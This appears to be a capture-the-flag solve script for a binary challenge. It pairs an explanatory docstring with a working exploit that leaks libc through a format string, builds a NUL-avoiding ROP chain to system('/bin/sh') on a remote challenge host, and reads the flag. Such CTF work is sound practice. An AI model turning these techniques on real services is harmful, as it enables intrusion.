#!/usr/bin/env python3
"""waf -- the "WAF" zeroes everything after the first NUL, so build the chain backwards.

    void __gets(char *buf) {
        int n = buf[0] ? read(0, buf, strlen(buf)) : read(0, buf, 0x80);
        for (int i = 0; i < n; i++)
            if (buf[i] == 0) { memset(buf + i, 0, n - i); break; }
    }
    // main: loop { puts(banner); printf(">> "); __gets(buf); if (!strncmp(buf,"exit",4)) break; }

The banner ("I made sure you can't rop no more") refers to that memset: any NUL in
the input wipes the rest, and every ROP address needs NUL bytes.

The hole is that the wipe only reaches as far as *this* read, and the loop lets us
write again and again.  A write of k bytes whose first NUL is at j leaves

    buf[0..j) = our bytes,  buf[j..k) = 0,  buf[k..) = untouched

so writing qwords **from the highest offset down** lays out zeros without ever
disturbing what was already placed.  Each write's k must stay under the previous
strlen(buf) = j, which holds because k drops by 8 each step.

The binary itself has no `pop rdi` gadget (rdi is *not* still buf on return --
glibc's SSE strncmp clobbers it, confirmed by returning to puts@plt and getting
garbage instead of the buffer).  But round 1 leaks libc, so round 2 uses libc's
own gadgets: 0x2a145 sits one byte inside `pop r15; ret` (41 5f c3) and therefore
decodes as `pop rdi; ret`.

An extra `ret` gadget fixes the 16-byte alignment: main's ret leaves rsp ≡ 0 mod 16
and each pop/ret pair keeps it there, while system expects ≡ 8 at entry.

Offsets: buf = rbp-0x50, saved rbp at +0x50, return address at +0x58.
The final write must stay under 0x58 bytes or it clobbers the chain.
"""
import os
import re
import socket
import sys
import time

HOST = os.environ.get("WAF_HOST", "chal.secso.cc")
PORT = int(os.environ.get("WAF_PORT", "4006"))

PRINTF_PLT = 0x4010D0
MAIN = 0x4012A2
SYSTEM_OFF = 0x53110       # glibc 2.41-12+deb13u2, same debian:13.4-slim image
RET_OFF = 0x29D65          # return addr of `call 29c30` inside __libc_start_main
POP_RDI_OFF = 0x2A145      # unaligned into `pop r15; ret` -> `pop rdi; ret`
RET_OFF_GADGET = 0x2A146
BINSH_OFF = 0x1A5EA4
CMD = b"exit"


def trimmed(addr):
    b = addr.to_bytes(8, "little")
    while b and b[-1] == 0:
        b = b[:-1]
    return b


class Waf:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=20)
        self.s.settimeout(8)
        time.sleep(0.4)

    def snd(self, d):
        self.s.sendall(d)
        time.sleep(0.25)

    def round(self, chain, final):
        assert len(final) < 0x58, len(final)
        self.snd(b"A" * 0x80)                       # no NUL -> no memset, full buffer
        for off, addr in sorted(chain, reverse=True):
            v = trimmed(addr)
            j, k = off + len(v), off + 8
            p = bytearray(b"A" * j)
            p[off:off + len(v)] = v
            p += b"\x00" + b"A" * (k - j - 1)
            self.snd(bytes(p))
        self.snd(final + b"\x00")

    def drain(self, t=5.0):
        self.s.settimeout(t)
        out = b""
        try:
            while True:
                c = self.s.recv(65536)
                if not c:
                    break
                out += c
        except socket.timeout:
            pass
        return out


w = Waf()
# round 1: printf(buf) leaks, then return into main for a second round
w.round([(0x58, PRINTF_PLT), (0x60, MAIN)], b"exit%13$p,%24$p")
time.sleep(1.0)
out = w.drain(4.0).decode(errors="replace")
m = re.search(r"exit(0x[0-9a-f]+),(0x[0-9a-f]+)", out)
if not m:
    sys.exit("[-] no leak:\n" + out[-500:])
ldbase, retaddr = int(m.group(1), 16), int(m.group(2), 16)
# %13$p is the ld.so base (libc image is 0x22d000 long); %24$p is libc+0x29d65.
base = retaddr - RET_OFF
print(f"[*] ld base = {hex(ldbase)}  ret-in-libc = {hex(retaddr)}  ->  libc base = {hex(base)}")
if base & 0xFFF:
    sys.exit("[-] derived libc base is not page aligned")
system = base + SYSTEM_OFF
print(f"[*] system = {hex(system)}")

# round 2: main re-zeroes the buffer, so the same trick works again
chain = [(0x58, base + POP_RDI_OFF), (0x60, base + BINSH_OFF),
         (0x68, base + RET_OFF_GADGET), (0x70, system)]
for off, addr in chain:
    v = trimmed(addr)
    if 0 in v:
        sys.exit(f"[-] inner NUL in {hex(addr)}; reconnect for a different ASLR base")
w.round(chain, CMD)
time.sleep(1.0)
w.s.sendall(b"cat /flag /flag.txt 2>/dev/null; id\n")
out = w.drain(6.0)
print(out.decode(errors="replace")[-600:])
f = re.search(rb"(K17\{[^}]*\}|SCONES\{[^}]*\})", out)
if f:
    print("[+] FLAG:", f.group(1).decode())
else:
    sys.exit("[-] no flag")
